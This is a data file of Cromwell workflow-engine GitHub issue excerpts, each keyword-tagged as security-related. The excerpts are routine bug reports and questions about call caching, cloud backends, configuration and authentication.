Security,"Hi all;; I'm testing out a CWL run (https://github.com/bcbio/bcbio_validation_workflows/tree/master/somatic-giab-mix) with a SLURM backend using file based caching:; ```; [2018-05-02 13:10:20,09] [info] Running with database db.url = jdbc:hsqldb:file:/projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/persist/metadata;shutdown=false;hsqldb.tx=mvcc; ```; and running into a hash exception at a consistent spot in the pipeline:; ```; [2018-05-02 15:16:51,49] [info] WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f [[38;5;2mbc4644da[0m]: Starting batch_for_variantcall; [2018-05-02 15:16:52,47] [[38;5;220mwarn[0m] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Unrecognized runtime attribute keys: memoryMax, tmpDirMin, cpuMax, cpuMin, tmpDirMax, outDirMin, memoryMin, outDirMax; [2018-05-02 15:16:55,18] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: [38;5;5m'bcbio_nextgen.py' 'runfn' 'batch_for_variantcall' 'cwl' 'sentinel_runtime=cores,1,ram,3839.9999999999995' 'sentinel_parallel=multi-batch' 'sentinel_outputs=batch_rec:resources;description;reference__fasta__base;config__algorithm__variantcaller;reference__snpeff__GRCh37_75;config__algorithm__coverage_interval;genome_resources__variation__train_hapmap;genome_resources__variation__encode_blacklist;metadata__batch;genome_resources__variation__lcr;metadata__phenotype;vrn_file;reference__twobit;config__algorithm__validate;config__algorithm__validate_regions;genome_build;genome_resources__aliases__human;config__algorithm__tools_off;genome_resources__variation__dbsnp;genome_resources__variation__polyx;genome_resources__variation__cosmic;reference__genome_context;analysis;config__algorithm__tools_on;config__algorithm__effects;config__algorithm__variant_regions;genome_resources__aliases__ensembl;config__algorithm__exclude_regions;reference__rtg;genome_resources__variation__train_indels;genome",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:408,hash,hash,408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['hash'],['hash']
Security,"Hi all;; In testing release 35 with CWL inputs I've also been looking at supporting remote URL references. This is working correctly for GS URLs but not for http URLs. I've put together a test case that demonstrates the problem:. https://github.com/bcbio/test_bcbio_cwl/tree/master/gcp. The `somatic-workflow-http` CWL workflow uses http URLs and doesn't work, while the comparable `somatic-workflow` CWL workflow uses GS URLs referencing the same data and does work. The workflow fails with:; ```; java.io.FileNotFoundException: Cannot hash file https://storage.googleapis.com/bcbiodata/test_bcbio_cwl/testdata/genom; es/hg19/seq/hg19.fa; ```; when running tasks. The files get downloaded to the input directories but get numerical values instead of the original file names so never seem to sync over and get translated correctly to the workflow; ```; ls -lh cromwell_work/cromwell-executions/main-somatic.cwl/eaa632df-52a8-4aae-826f-647a42fa7145/call-prep_samples_to_rec/inputs/1515144/; total 136K; -rw------- 2 chapmanb chapmanb 292 Sep 26 14:07 225050424226294657; -rw------- 2 chapmanb chapmanb 43 Sep 26 14:07 2612405277530248055; -rw------- 2 chapmanb chapmanb 43 Sep 26 14:07 503001634356675169; -rw------- 2 chapmanb chapmanb 292 Sep 26 14:07 5802330287039666628; -rw------- 2 chapmanb chapmanb 43 Sep 26 14:07 5809676514510180826; -rw------- 2 chapmanb chapmanb 43 Sep 26 14:07 6090832304768530540; -rw------- 2 chapmanb chapmanb 43 Sep 26 14:07 6105514522473810611; -rw------- 3 chapmanb chapmanb 37K Sep 26 14:07 6807576659333162957; -rw------- 3 chapmanb chapmanb 150 Sep 26 14:07 6853384576121493061; -rw------- 2 chapmanb chapmanb 292 Sep 26 14:07 7483350933664987331; -rw------- 2 chapmanb chapmanb 292 Sep 26 14:07 7538690575330349970; -rw------- 3 chapmanb chapmanb 37K Sep 26 14:07 7691692211431528147; -rw------- 2 chapmanb chapmanb 292 Sep 26 14:07 7783203266940950463; -rw------- 3 chapmanb chapmanb 150 Sep 26 14:07 8389565043859020157; -rw------- 2 chapmanb chapmanb 43 Sep 26",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184:537,hash,hash,537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184,1,['hash'],['hash']
Security,"Hi folks,; I am running cromwell 36 with AWS batch. Doing the hello world example from the following:. https://aws.amazon.com/blogs/compute/using-cromwell-with-aws-batch/. I am able to submit from the swagger UI and am getting the following erro:. `2018-10-30 00:39:25,929 INFO - jobQueueArn: arn:aws:batch:us-east-2:365166883642:job-queue/GenomicsHighPriorityQue-0c2108973103ca2; 2018-10-30 00:39:25,929 INFO - taskId: wf_hello.hello-None-1; 2018-10-30 00:39:25,929 INFO - hostpath root: wf_hello/hello/bcc91ab0-fd91-41a8-b3e6-cbf091cb511d/None/1; 2018-10-30 00:39:25,965 cromwell-system-akka.dispatchers.backend-dispatcher-229 ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(bcc91ab0)wf_hello.hello:NA:1]: Error attempting to Execute; software.amazon.awssdk.core.exception.SdkClientException: Unable to execute HTTP request: batch.default.amazonaws.com: Name or service not known`. Any idea the source of this error?; <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334:1678,PASSWORD,PASSWORDS,1678,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334,1,['PASSWORD'],['PASSWORDS']
Security,"Hi there,. Biocontainers are incredibly popular tools in bioinformatics. Each time a [Bioconda recipe](https://bioconda.github.io/recipes.html) is made, a Biocontainer is automatically generated. This creates a collection of Dockerized tools immediately available to everybody. To reduce footprint, Biocontainers run on BusyBox, a Linux version tailored to embedded systems. Some tools therefore do not expose the full set of options of matching GNU tools on Ubuntu, CentOS, etc. Given the popularity of Biocontainers, it would be great if Cromwell could support them fully. There are a couple of small bugs related to `find` and `xargs` that should be easy to fix when one explores the file `stderr.background` for a task run from a Biocontainer:. ```; find: unrecognized: -empty; BusyBox v1.22.1 (2014-05-23 01:24:27 UTC) multi-call binary. Usage: find [-HL] [PATH]... [OPTIONS] [ACTIONS]. Search for files and perform actions on them.; First failed action stops processing of current file.; Defaults: PATH is current directory, action is '-print'. 	-L,-follow	Follow symlinks; 	-H		...on command line only; 	-xdev		Don't descend directories on other filesystems; 	-maxdepth N	Descend at most N levels. -maxdepth 0 applies; 			actions to command line arguments only; 	-mindepth N	Don't act on first N levels; 	-depth		Act on directory *after* traversing it. Actions:; 	( ACTIONS )	Group actions for -o / -a; 	! ACT		Invert ACT's success/failure; 	ACT1 [-a] ACT2	If ACT1 fails, stop, else do ACT2; 	ACT1 -o ACT2	If ACT1 succeeds, stop, else do ACT2; 			Note: -a has higher priority than -o; 	-name PATTERN	Match file name (w/o directory name) to PATTERN; 	-iname PATTERN	Case insensitive -name; 	-path PATTERN	Match path to PATTERN; 	-ipath PATTERN	Case insensitive -path; 	-regex PATTERN	Match path to regex PATTERN; 	-type X		File type is X (one of: f,d,l,b,c,...); 	-perm MASK	At least one mask bit (+MASK), all bits (-MASK),; 			or exactly MASK bits are set in file's mode; 	-mtime DAYS	mtime is ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4607:403,expose,expose,403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4607,1,['expose'],['expose']
Security,"Hi there,. I'm new to both WDL and Cromwell and am trying to get an analysis pipeline up and running. I'm using call-caching to speed up my development, so that I don't have to repeat multi-hour steps. However, I'm currently seeing ~8 minute delays for processing cache hits. With multiple steps in serial, this means that nothing in my pipeline starts running till 14 minutes after I start the run. Can you help me fix that?. Thank you for the help!. Happy to provide any more info than the below if that's helpful. I'm running with cromwell 84. Here's the command I'm running `java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar run workflow/expanse_workflow.wdl`. Here's my configuration (ignore the SLURM part, I'm not using it yet). Potentially important bits:; * I'm running with the local backend.; * I'm using symlink caching so that should be fast, with path+timestamp hash codes so the whole file doesn't need to be read; * I'm using the file based Hsql database. I don't see why that should matter, but maybe it does.; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # only use double quotes!; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; }. ## file based persistent database; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }. call-caching {; enabled = true; }. backend {; default = ""Local""; providers { ; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; submit = ""/usr/bin/env ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:899,hash,hash,899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hash']
Security,"Hi, . I downloaded the jar file from the GitHub release page:. > wget https://github.com/broadinstitute/cromwell/releases/download/34/cromwell-34.jar. sha256sum results in the hash mentioned by @Horneth. Actually I have two java versions on my system:. ```; java version ""1.8.0_20""; Java(TM) SE Runtime Environment (build 1.8.0_20-b26); Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode); ```; and. ```; openjdk version ""1.8.0_141""; OpenJDK Runtime Environment (build 1.8.0_141-b16); OpenJDK 64-Bit Server VM (build 25.141-b16, mixed mode); ```. It fails with the first one, however I can launch the server with the openjdk version.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4082#issuecomment-420540300:176,hash,hash,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4082#issuecomment-420540300,1,['hash'],['hash']
Security,"Hi, . I have a question/require help. When implementing call caching and using a scatter, if a task/shard fails does cromwell restart then entire task?. Example. I am running ~200 alignments creating ~200 bam files, rather large ones, say if 190 complete and the last one fails, when I restart I am seeing that the entire 200 bam alignments are run again. Is it possible to have cromwell's call caching resume after the 190 completed alignments as opposed to rerunning them?. Has anyone come across this? I am thinking it might be possible using the following parameters. 1. - ContinueWhilePossible = true; 2. - System.file-hash-cache = true; 3. - System.graceful-server-shutdown = true. We are currently trying this but I wanted to see if anyone has come across this as well?. Thanks for your help!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5966:624,hash,hash-cache,624,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5966,1,['hash'],['hash-cache']
Security,"Hi, I added a recipe for cromwell to the bioconda channel:; https://github.com/bioconda/bioconda-recipes/tree/master/recipes/cromwell. Updating it is currently a manual affair, mostly consisting of updating the package source, version number, and hash. It would be nice if Travis could update the recipe automatically upon successful builds of new tagged releases. We do this in our viral-ngs recipe, and render a [jinja2 template](https://github.com/broadinstitute/viral-ngs/tree/master/packaging/conda-recipe) based on conda requirement files, though we [publish](https://github.com/broadinstitute/viral-ngs/blob/master/travis/deploy.sh) to a separate channel on anaconda.org, and not bioconda. Is automatic deployment of a cromwell conda package something the team would support?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2258:247,hash,hash,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2258,1,['hash'],['hash']
Security,"Hi, I am using cromwell-59.jar, and run in local backend mode. ; Used command:; `java -Dconfig.file=cromwell.examples.conf -jar ~/softwares/cromwell-59.jar run example.wdl -i input_detail.json`. however, when I try to re-run a successed workflow to validate the cache calling function, I got the following information that confused me. very much. Would you be kind to give me some ideas on what's going on? . `a588e03e-a4fc-4809-b5f5-bb540cac9ca3-EngineJobExecutionActor-rnaseq_pipeline.fastp:NA:1 [UUID(a588e03e)]: Could not copy a suitable cache hit for a588e03e:rnaseq_pipeline.fastp:-1:1. No copy attempts were made.`. following is the source code related I fetched, but still cannot understand it. `if (data.cacheHitFailureCount > 0) {; val totalHits = data.cacheHitFailureCount; val copyFails = data.failedCopyAttempts; val blacklisted = totalHits - copyFails; workflowLogger.info(; s""Could not copy a suitable cache hit for $jobTag. "" +; s""EJEA attempted to copy $totalHits cache hits before failing. "" +; s""Of these $copyFails failed to copy and $blacklisted were already blacklisted from previous attempts). "" +; s""Falling back to running job.""; ); val template = s""BT-322 {} cache hit copying failure: {} failed copy attempts of maximum {} with {}.""; log.info(template, jobTag, data.failedCopyAttempts, callCachingParameters.maxFailedCopyAttempts, data.aggregatedHashString); } ; else {; log.info(s""BT-322 {} cache hit copying nomatch: could not find a suitable cache hit."", jobTag); workflowLogger.info(""Could not copy a suitable cache hit for {}. No copy attempts were made."", jobTag); }`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6484:249,validat,validate,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484,1,['validat'],['validate']
Security,"Hi, I see you've indeed created a service account and gotten a json file, but I'm not seeing how you're passing it to Cromwell.; Your configuration uses `application_default` as authentication mode, and you are logged in using your personal gmail it seems.; Did you use this json in any way ?. To use the service account in Cromwell you'd want to either; 1 - Recommended) Change your configuration to use the service account instead of application default; You can see how to do that [here](https://cromwell.readthedocs.io/en/develop/backends/Google/); It is slightly outdated, instead of `pem-file` use `json-file` and the path to your json.; 2) You can keep application default and use [`gcloud auth activate-service-account`](https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account) to authenticate as the service account on your machine. Also could you print the result of `gcloud auth list` ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392038451:178,authenticat,authentication,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392038451,2,['authenticat'],"['authenticate', 'authentication']"
Security,"Hi, in order to have access to all akka features (e.g. ask-Pattern) it would be good to use the latest version of the framework for Cromwell (as per today 2.4.8)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1188:21,access,access,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1188,1,['access'],['access']
Security,"Hi, is it possible to invalidate cache with timeout? I am asking because we do not keep the results of calls infinitely, only for 6 weeks. I assume that cache will be kept in DB and call will try to copy a directory that is corrupted (we delete files but not directory structure). Otherwise we would have to access DB and remove calls manually. Rafal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174:308,access,access,308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174,1,['access'],['access']
Security,"Hi, we have Cromwell running in docker on a GCP VM, and the service account of the GCP VM has access to the image registry. I don't think we are doing anything else to gain access to the private registry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965:94,access,access,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2132863965,2,['access'],['access']
Security,"Hi,. I have built a WDL workflow which works well with SLURM but now I am trying to get it to be able to be run on a standalone server. . I have Slurm as my provider and have created one for Local. ` Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. run-in-background = true; exit-code-timeout-seconds = 300; workflow-reset = true; read_from_cache = true; write_to_cache = true; system.file-hash-cache=true; concurrent-job-limit = 2. runtime-attributes = """"""; String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg""; """""". submit = ""singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; } ## end local; } ## end file systems; } ## end config; } ## End Local`. Oddly, when running the workflow I get a submit docker error. ie. as per below. I have no idea why it's looking for docker as I'm not knowingly using it. I'm not using docker in my run time parameters. I have been able to get standalone working on another workflow by passing a singularity container to each task command output but I was wondering if there was a more elegant solution I could use such as just changing to a pre-made provider. I have searched Google and through here but not found anything. I did find one issue here but they seemed to want to use docker where as I don't. . Thanks for the help!. `task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_scri",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862:447,hash,hash-cache,447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862,1,['hash'],['hash-cache']
Security,"Hi,. I just moved to a new cluster (no sudo) and try to run a WDL script with Cromwell-31.; Everything worked fine on my previous cluster (same Cromwell / WDL / Java versions and same script). After creating the wdl script, I validated it and generated a JSON file (with wdl-0.14), no problem. After running `java -jar cromwell-31.jar run my_script.wdl -i my_script.JSON` the workflow stops, outputting `Permission denied` for the program I call in my .wdl script (which is called from the 'cromwell_executions' folder during the process). I changed the permission to 777 for this program located in my `/usr/bin`, but still the same issue. The program, once located in the 'cromwell_executions' folder, loses the execution permission for the owner.; Same issue no matter if I submit a PBS job or run it interactively. Is there anything to mention in a cromwell configuration file or something to tune in the cluster?. Thanks !",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3500:226,validat,validated,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3500,1,['validat'],['validated']
Security,"Hi,. I was wondering if there's any interest to support a new backend for submitting jobs to a Hashicorp Nomad cluster?; I suppose this will be fairly similar to the AWS batch system. Thanks; Matthias. ping @tomiles",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6001:95,Hash,Hashicorp,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6001,1,['Hash'],['Hashicorp']
Security,"Hi,. I'm finding that Cromwell is using too many resources in a shared environment. It's spawning other threads and using up to 400% CPU, which I can't see why when the logs just show it's watching for jobs (maybe it's trying to hash files for call-caching?). I'd love a way to limit it, even at the expense of speed of the program, it would also be great if there was tooling (maybe an endpoint) to gauge the resource usage, and see what Cromwell's actually doing. For context, I'm running Cromwell on a (shared) login node, submitting jobs to Slurm (custom SFS config). The workflow is scattering a subworkflow 25 times, each with 4 steps. All of those have actually executed prior and it's taking a long time (sometimes > 30 minutes) to look up a call result. I am using call-caching with a mysql database.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4945:229,hash,hash,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4945,1,['hash'],['hash']
Security,"Hi,. What is the way to specify resource requirements (cores, ram etc) to AWSBatch? . I am executing a CWL workflow with AWS batch backend. ; Each task is submitted by cromwell and I can verify on AWS console that all jobs ended successfully.; However, for jobs that I have set coresMin and coresMax requirements I get the warning:. ```; [warn] AwsBatchAsyncBackendJobExecutionActor [6bd79e09fastqc_1:NA:1]: Unrecognized runtime attribute keys: cpuMax; ```. and at the end of the workflow the error:; ```; [error] Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:532,validat,validation,532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,7,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validation']"
Security,"Hi,; ; I'm experiencing the same problem on AWS Batch. My workflow has 2 subworkflows. Even I don't change any part of my workflow/subworkflow, the caching only works for the first task in subworkflows. The subsequent tasks cannot be recognized by hashing. I guess this is because the subworkflow id is also involved in the task inputs, so it change hash. . Does anyone have any update or workaround for this problem? Thank you in advance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4699#issuecomment-716072581:248,hash,hashing,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4699#issuecomment-716072581,2,['hash'],"['hash', 'hashing']"
Security,"Hi,; I am trying to run a workflow on AWS Batch using the genomics-ami.; The ami was built following the instructions in the relevant pages and i have confirmed that it contains a /cromwell-root mount point and has rw access to the bucket we use.; The AWS batch backpoint was tested with the hello.wdl workflow and it went through. When running the workflow on the local filesystem it completes without errors but when running it using the AWS Batch backend the first step fails with the following error:. ```; 2019-01-11 20:27:06,80] [error] WorkflowManagerActor Workflow 8fa7a9e4-f30d-4c19-b8cb-68be6442f317 failed (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt: s3://s3.amazonaws.com/bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt; Caused by: java.io.IOException: Could not read from s3://bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt: s3://s3.amazonaws.com/bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542:218,access,access,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542,1,['access'],['access']
Security,"Hi,; I am using cromwell 51. I am currently in the process of moving my WDL scripts from draft-2 to 1.0. When I try to access metadata the `inputs` key is different between versions of WDL:; draft-2:; ```; ""inputs"": {; ""hello.another_input"": ""Test"",; ""hello.input_json"": ""xxx"",; ""hello.name"": ""John""; }; ```; 1.0; ```; ""inputs"": {; ""another_input"": ""Test"",; ""input_json"": ""xxx"",; ""name"": ""John""; }; ```. The workflow name is removed. I searched docs and source code but I could not find any info about this. Is there any info about it and if this is correct behaviour?. Edit.; I do not have simple example but when there is a subworkflow the inputs for subworkflow have correct workflow suffix which is inconsistent. Thanks",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5563:119,access,access,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5563,1,['access'],['access']
Security,"Hi-. The HuBMAP consortium has been implementing some workflows in CWL and running these via `cwltool` -- we're quite interested in storing the provenance information for a workflow run in Research Object format. This would include the inputs and outputs for a certain run, in addition to (a normalized version of) the workflow itself. This is already implemented in `cwltool` and accessible through its `--provenance` flag; is anything like this planned for Cromwell?. Some of the HuBMAP tissue mapping centers are interested in or have been using pipelines written in WDL (e.g. [ENCODE's ATAC-seq pipeline](https://github.com/ENCODE-DCC/atac-seq-pipeline), and we would like to support these without giving up the ability to store workflow run provenance in a standard format. Is anything like this planned for Cromwell? I didn't see anything in the issue/forum/PR searches I've been doing. Thank you!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5052:381,access,accessible,381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5052,1,['access'],['accessible']
Security,"Hi. I'm trying to enable call caching using a local file database and I can't seem to get it to work. Everything that I try does not seem to make a difference, and each run always starts from the first task. I'm running cromwell in run mode from the command line, and I am testing on both cromwell 43 and cromwell 47. I also have write-to-cache and read-from-cache set to true in my options.json (although I understand that is the default behaviour). I am unable to use a mySQL or postgres database at this current time. Is there something that I'm missing? Is there any additional information that is needed to help diagnose this?. My cromwell.conf is as follows:. backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; exit-code-timeout-seconds = 600. runtime-attributes = """"""; Int cpus; Float memory_mb; String lsf_queue; String lsf_project; """""". submit = """"""; bsub \; -q ${lsf_queue} \; -P ${lsf_project} \; -J ${job_name} \; -cwd ${cwd} \; -o ${out} \; -e ${err} \; -n ${cpus} \; -R rusage[mem=${memory_mb}] \; /usr/bin/env bash ${script}; """""". job-id-regex = ""Job <(\\d+)>.*"". kill = ""bkill ${job_id}""; check-alive = ""bjobs ${job_id}"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=100000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 86400000; numThreads = 1; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5370:1381,hash,hashing-strategy,1381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5370,1,['hash'],['hashing-strategy']
Security,"Hmm, this seems a bit odd. The `application_default` authentication should still work with a service account, as long as you set the `$GOOGLE_APPLICATION_CREDENTIALS` variable is set, which @juhawilppu seems to have done here. I had this same issue, where my service account only worked once I used a `scheme = ""service_account""`, but that seems like something is implemented wrongly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-432526506:53,authenticat,authentication,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-432526506,1,['authenticat'],['authentication']
